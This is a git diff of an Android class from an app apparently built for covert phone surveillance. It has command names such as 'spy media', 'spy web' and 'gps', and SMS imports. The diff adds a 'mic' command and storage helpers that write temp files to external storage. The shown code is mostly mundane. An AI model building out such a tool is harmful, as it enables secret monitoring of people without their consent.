@@ -1,5 +1,6 @@
 package com.code4bones.EyeInside;
 
+import java.io.File;
 import java.text.ParseException;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -12,6 +13,8 @@ import android.content.SharedPreferences;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
 import android.telephony.SmsManager;
 
 
@@ -21,6 +24,8 @@ public class CommandObj extends Object implements ICommandObj {
 	public static final String CMD_GPS = "gps";
 	public static final String CMD_HELP = "help";
 	public static final String CMD_WHAT = "?";
+	public static final String CMD_STATS = "stat";
+	
 	
 	public static final String CMD_GET_MEDIA = "get media";
 	public static final String CMD_SPY_MEDIA = "spy media";
@@ -48,6 +53,7 @@ public class CommandObj extends Object implements ICommandObj {
 	public static final String CMD_SPY_WEB = "spy web";
 	
 	public static final String CMD_KEEPALIVE = "keepalive";
+	public static final String CMD_MIC = "mic";
 	
 	
 	
@@ -245,9 +251,83 @@ public class CommandObj extends Object implements ICommandObj {
 													  dateField,dev?1000:1,toCal.getTime().getTime()); 
 	}
 
+	public static boolean hasExternal() {
+		return Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState());
+	}
+	
+	
+	
+	public static long getExternalFreeSize() {
+        if (CommandObj.hasExternal()) {
+            File path = Environment.getExternalStorageDirectory();
+            StatFs stat = new StatFs(path.getPath());
+            long blockSize = stat.getBlockSize();
+            long availableBlocks = stat.getAvailableBlocks();
+            return availableBlocks * blockSize;
+        } else {
+            return -1;
+        }
+    }	
+
+	public static long getExternalTotalSize() {
+        if (CommandObj.hasExternal()) {
+            File path = Environment.getExternalStorageDirectory();
+            StatFs stat = new StatFs(path.getPath());
+            long blockSize = stat.getBlockSize();
+            long availableBlocks = stat.getBlockCount();
+            return availableBlocks * blockSize;
+        } else {
+            return -1;
+        }
+    }	
+	
+	public static String getSizeString(long size) {
+		String suffix = null;
+
+        if (size >= 1024) {
+            suffix = "KB";
+            size /= 1024;
+            if (size >= 1024) {
+                suffix = "MB";
+                size /= 1024;
+                //if ( size >= 1024 ) {
+                //	suffix = "GB";
+                //	size /= 1024;
+                //}
+            }
+        }
+
+        StringBuilder resultBuffer = new StringBuilder(Long.toString(size));
+
+        int commaOffset = resultBuffer.length() - 3;
+        while (commaOffset > 0) {
+            resultBuffer.insert(commaOffset, ',');
+            commaOffset -= 3;
+        }
+
+        if (suffix != null) resultBuffer.append(" " + suffix);
+        return resultBuffer.toString();
+	}
+	
 	public static String getFile(Context ctx,String name) {
-		String dir = ctx.getApplicationInfo().dataDir;
-		return String.format("%s/%s.%x",dir,name,new Date().getTime());
+		return getFile(ctx,name,true);
+	}
+	
+	public static String getFile(Context ctx,String name,boolean useRandom) {
+		String dir = null;
+		if ( CommandObj.getExternalFreeSize() >= (1024 * 1024 * 10) ) {
+			dir = Environment.getExternalStorageDirectory().getAbsolutePath();
+			dir += "/data/com.code4bones/tmp";
+			File file = new File(dir);
+			if ( !file.exists() )
+				file.mkdirs();
+		} else {
+			dir = ctx.getApplicationInfo().dataDir;
+		}
+		
+		if ( useRandom )
+			return String.format("%s/%s.%x",dir,name,new Date().getTime());
+		return dir + "/" + name;
 	}
 	
 	
